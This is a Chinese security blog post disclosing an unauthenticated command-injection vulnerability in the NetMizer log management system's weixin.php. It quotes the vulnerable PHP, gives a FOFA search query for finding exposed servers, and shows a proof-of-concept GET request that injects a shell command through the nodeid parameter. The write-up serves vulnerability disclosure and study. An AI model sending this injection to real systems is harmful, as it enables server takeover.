---
title: "NetMizer日志管理系统 weixin.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-search-weixin-nodeid-rce.html
asset_dir: assets/netmizer日志管理系统-weixin.php-命令执行漏洞
---

# NetMizer日志管理系统 weixin.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/21 08:23
- 924浏览
- [0评论](#comment)
- 19分钟阅读

深入探索

软件

鉴权

SQL

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/weixin.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

移动与无线

# 影响版本

老旧版本

# fofa语法

> `body="日志管理系统" && body="NetMizer"`

# 漏洞分析

深入探索

服务器

漏洞修复方案

数据库

看下 `weixin.php` 业务实现关键逻辑部分

```
?php
    include('../include/JSON.php');

    $cmd = "/var/www/cgi-bin/search_wx";

    $sqltable = "tbl_weixin_log";

    list($year,$month,$day,$hour,$min,$second)=split(":| |-", $starttime);
    $start_time = mktime($hour, $min, $second, $month,$day,$year);
    $cmd .= " -s $start_time";
    list($year,$month,$day,$hour,$min,$second)=split(":| |-", $stoptime);
    $stop_time  = mktime($hour, $min, $second, $month,$day,$year);
    $cmd .= " -e $stop_time";

    if($nodeid != ""){
       $sql_nodeid = " and nodeid = ".ip2long($nodeid)." ";
       $cmd .= " -n $nodeid";
    } else $sql_nodeid = "";

    $srcip = $src;
    if($srcip == ""){
       $srcid = "-1";
    } else $srcid = ip2long($srcip); 
    if($srcid != "-1"){
       $sql_srcid = " and src_addr = $srcid ";
       $cmd .= " -S $srcid";
    } else {
       $sql_srcid = "";
    }

    $user = $username;
    if($user != ""){
       $sql_user = " and user_name = \"$user\" ";
       $cmd .= " -u $user";
    } else {
       $sql_user = "";
    }

    if($uid != ""){
       $sql_uid = " and wx_uid = $uid ";
       $cmd .= " -q $uid";
    } else {
       $sql_uid = "";
    }

    if(!isset($start)) $start = 0;
    if(!isset($limit)) $limit = 200;
    $cmd .= " -f $start -t 100000";

    if($action == 'file'){
       //echo $cmd."\n";
       $fp = @popen($cmd,"r");
       if(!$fp){
          echo '{"success":true,"info":"no data"}';
          return;
       }
```

多个用户可控且无过滤和校验的参数如 nodeid、username、uid 直接拼接进cmd命令中，然后使用popen执行命令，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

漏洞预警服务

```
GET /data/search/weixin.php?action=file&nodeid=;sleep+3+%23+ HTTP/1.1
Host: netmizer.mrxn.net
```

成功执行 延时 3 秒

[![NetMizer日志管理系统 weixin.php 命令执行漏洞](images/img-001-ce30300a89ee.webp)](https://image.mrxn.net/d870b4b1ea4e4d16823eb782280d5acc.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
